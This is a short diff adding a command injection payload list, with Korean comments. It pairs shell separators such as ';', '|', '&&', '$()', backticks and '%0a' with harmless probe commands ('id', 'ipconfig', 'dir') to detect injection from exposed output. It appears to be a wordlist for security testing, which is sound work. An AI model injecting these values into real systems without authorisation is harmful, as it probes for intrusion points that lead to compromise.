@@ -1,0 +1,16 @@
+# Command Injection - 명령 실행 결과 노출로 확인 (Unix id / Windows ipconfig·dir)
+# --- Unix: 구분자별로 id 실행 (uid= 출력 노출) ---
+; id
+| id
+|| id
+& id
+&& id
+$(id)
+`id`
+%0a id
+# --- Windows: ipconfig / dir 실행 (출력 노출) ---
+& ipconfig
+| ipconfig
+&& ipconfig
+& dir
+| dir
